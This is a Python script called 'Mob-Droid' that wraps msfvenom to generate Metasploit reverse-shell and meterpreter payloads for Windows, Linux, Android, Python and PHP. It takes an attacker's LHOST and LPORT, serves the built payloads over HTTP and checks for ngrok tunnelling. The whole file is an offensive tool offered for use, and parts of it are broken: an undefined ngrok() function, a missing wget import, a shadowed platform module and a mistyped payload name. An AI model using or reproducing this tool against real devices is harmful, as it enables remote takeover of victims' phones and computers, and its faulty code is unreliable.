#!/usr/bin/python
#-*- coding: utf-8 -*-
#Author      Mohit Saran
#YouTube     Hacker's King
#Instagram   Kinghacker0
#Website     hackersking.in

import os, platform
from SimpleHTTPServer import test
from sys import exit
from time import sleep

red= '\033[91m'
orange= '\33[38;5;208m'
green= '\033[92m'
cyan= '\033[36m'
bold= '\033[1m'
end= '\033[0m'

def head():
    os.system('clear')
    print'''{0}
                 ▀▄   ▄▀
                ▄█▀███▀█▄
               █▀███████▀█
               █─█▀▀▀▀▀█─█
                  ▀▀─▀▀
       *****    Mob-Droid   *****
{2}Follow me :{3}
{1}•{3} GitHub : {4}https://github.com/kinghacker0{3}
{1}•{3} YouTube: {4}https://www.youtube.com/hackersking101{3}
{1}•{3} Website: {4}https://hackersking.in{3}
'''.format(orange, green, bold, end, cyan)

def finish():
    head()
    print('{0}Until next time...{1}').format(green, end)
    exit(0)

def present():
    if os.path.isfile('/data/data/com.termux/files/usr/bin/msfconsole') == False:
        print('{0}Failed to locate msfvenom. Make sure Metasploit-Framework is installed correctly and try again.{1}').format(red, end)
        exit(0)
    if os.path.isdir('output') == False:
        head()
        print('{0}Creating output directory{1}').format(green, end)
        os.makedirs('output')
        sleep(1)
    if os.path.isfile('ngrok') == False:
        head()
        print("{0}Downloading Ngrok...{1}").format(green, end)
        if platform.architecture == "32bit":
            wget.download('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.tgz')
            os.system('tar -xf ngrok-stable-linux-386.tgz')
            os.system('rm ngrok-stable-linux-386.tgz')
        else:
            os.system('tar -xf ngrok-stable-linux-amd64.tgz')
            os.system('rm ngrok-stable-linux-amd64.tgz')

def server():
    os.system('cd output/ && python -m SimpleHTTPServer 80')

def main(platform, type):
    lhost = raw_input("\nEnter your LHOST\n{0}{1}Mob-Droid:~/LHOST#{2} ".format(green, bold, end))
    lport = raw_input("\nEnter your LPORT\n{0}{1}Mob-Droid:~/LPORT#{2} ".format(green, bold, end))
    output = raw_input("\nEnter the name of output file\n{0}{1}Mob-Droid:~/output#{2} ".format(green, bold, end))
    #Windows
    if platform == 'Windows' and type == '1':
        payload= 'windows/meterpreter/reverse_http'
        format= 'exe'
        extension= '.exe'
    if platform == 'Windows' and type == '2':
        payload= 'windows/meterpreter/reverse_https'
        format= 'exe'
        extension= '.exe'
    if platform == 'Windows' and type == '3':
        payload= 'windows/meterpreter/reverse_tcp'
        format= 'exe'
        extension= '.exe'
    #linux
    if platform == 'Linux' and type == '1':
        payload= 'linux/x86/shell/reverse_tcp'
        format= 'elf'
        extension= '.elf'
    if platform == 'Linux' and type == '2':
        payload= 'linux/x86/meterpreter/reverse_tcp'
        format= 'elf'
        extension= '.elf'
    #Android
    elif platform == 'Android' and type == '1':
        payload= 'android/meterpreter/reverse_http'
        format= 'raw'
        extension= '.apk'
    elif platform == 'Android' and type == '2':
        payload= 'android/meterpreter/reverse_https'
        format= 'raw'
        extension= '.apk'
    elif platform == 'Android' and type == '3':
        payload= 'android/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.apk'
    #Python
    elif platform == 'Python' and type == '1':
        payload= 'python/meterpreter/reverse_http'
        format= 'raw'
        extension= '.py'
    elif platform == 'Python' and type == '2':
        payload= 'python/meterpreter/reverse_https'
        format= 'raw'
        extension= '.py'
    elif platform == 'Python' and type == '3':
        payload= 'python/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.py'
    #PHP
    elif platform == 'PHP' and type == '1':
        payload= 'php/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.php'
    os.system('msfvenom -p '+payload+' LHOST='+lhost+' LPORT='+lport+' -f'+format+' -o output/'+output+extension)
    sleep(3)
    if os.path.isfile('output/'+output+extension) == False:
        head()
        raw_input('{2}Failed to create payload, please try again.{1} {0}(Hit Enter to continue){1}'.format(bold, end, red))
        choosepayload()
       
def choosepayload():
    head()
    select = raw_input('{2}Choose a payload platform:{1}\n\n{0}[{1}1{0}]{1} Windows\n{0}[{1}2{0}]{1} Linux\n{0}[{1}3{0}]{1} Android\n{0}[{1}4{0}]{1} Python\n{0}[{1}5{0}]{1} PHP\n{0}[{1}0{0}]{1} Exit\n\n{0}{2}Mob-Droid:~#{1} '.format(green, end, bold))
    if select == '1':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} windows/meterpreter/reverse_http\n{0}[{1}2{0}]{1} windows/meterpreter/reverse_https\n{0}[{1}3{0}]{1} windows/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}Mob-Droid:~/Windows#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Windows', type)
    elif select == '2':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} linux/x86/shell/reverse_tcp\n{0}[{1}2{0}]{1} linux/x86/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}Mob-Droid:~/Linux#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Linux', type)
    elif select == '3':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} android/meterpreter/reverse_http\n{0}[{1}2{0}]{1} android/meterpreter/reverse_https\n{0}[{1}3{0}]{1} android/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}Mob-Droid:~/Android#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Android', type)
    elif select == '4':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} python/meterpreter/reverse_http\n{0}[{1}2{0}]{1} python/meterpreter/reverse_https\n{0}[{1}3{0}]{1} python/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}Mob-Droid:~/Python#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Python', type)
    elif select == '5':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} php/meterprter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}Mob-Droid:~/PHP#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('PHP', type)
    elif select == '6':
        ngrok()
    elif select == '0':
        finish()
    else:
        head()
        print('{0}Please choose a valid option.{1}').format(red, end)
        sleep(2)
        choosepayload()

if __name__ == "__main__":
    try:
        head()
        present()
        choosepayload()
    except KeyboardInterrupt:
        finish()
